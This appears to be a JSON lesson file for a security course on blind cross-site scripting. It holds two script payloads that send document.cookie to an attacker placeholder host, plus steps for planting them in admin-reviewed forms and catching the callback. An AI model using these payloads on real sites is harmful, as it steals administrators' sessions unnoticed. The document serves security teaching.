@@ -1,0 +1,74 @@
+[
+  {
+    "type": "section_heading",
+    "id": "blind-xss-core",
+    "text": "Understanding Blind XSS"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-xss-definition",
+    "text": "<highlight>Blind XSS</highlight> is a form of Stored XSS where the malicious payload is executed in a high-privileged application or page that the attacker cannot access. The attacker 'fires and forgets,' waiting for a callback from a victim (usually an administrator) who views the stored data in an internal dashboard."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "blind-xss-discovery",
+    "text": "Testing for Blind Vulnerabilities"
+  },
+  {
+    "type": "explanation",
+    "id": "blind-xss-testing",
+    "title": "Why alert() Often Fails in Blind Scenarios",
+    "items": [
+      "If you use <highlight>alert()</highlight>, the popup triggers on the Admin's screen, not yours.",
+      "The Admin will immediately know they are under attack and close the ticket/report.",
+      "To succeed, you need an <highlight>Out-of-Band (OOB)</highlight> callback to confirm execution."
+    ]
+  },
+
+  {
+    "type": "section_heading",
+    "id": "blind-xss-payloads",
+    "text": "The Callback Payload (Silent Data Theft)"
+  },
+  {
+    "type": "code_block",
+    "id": "blind-xss-code",
+    "language": "javascript",
+    "code": "\n<script>new Image().src='http://<ATTACKER_IP>/log?c=' + btoa(document.cookie);</script>\n\n\n<script>fetch('http://<ATTACKER_IP>/?' + btoa(document.cookie));</script>"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-xss-analysis",
+    "text": "The goal is to be <highlight>silent</highlight>. The payload reaches out to the attacker's server, carrying the sensitive session cookie as a URL parameter. The Admin sees nothing unusual on their dashboard while their session is being hijacked."
+  },
+
+  {
+    "type": "section_heading",
+    "id": "blind-xss-attack-flow",
+    "text": "The 'Wait and See' Methodology"
+  },
+  {
+    "type": "explanation",
+    "id": "blind-xss-flow-steps",
+    "title": "Execution Steps",
+    "items": [
+      "**Identify Entry Point:** Find a form that an admin must eventually review (Support Tickets, Bug Reports, Contact Forms).",
+      "**Deploy Listener:** Set up <highlight>Netcat</highlight>, <highlight>Python SimpleHTTPServer</highlight>, or a tool like <highlight>XSS Hunter</highlight>.",
+      "**Inject Payload:** Submit the callback script into the form.",
+      "**Wait:** Execution only happens when the Admin logs in and views your specific entry.",
+      "**Capture:** Check logs for an incoming GET request containing a Base64 string."
+    ]
+  },
+
+  {
+    "type": "section_heading",
+    "id": "blind-xss-key-takeaway",
+    "text": "Key Differences"
+  },
+  {
+    "type": "order_block",
+    "id": "blind-xss-vs-stored",
+    "text": "The main difference between Blind and normal Stored XSS is the <highlight>Visibility</highlight>. In normal Stored XSS, you can verify the exploit yourself. In Blind XSS, you rely entirely on your <highlight>external listener</highlight> to know if the attack was successful."
+  }
+]
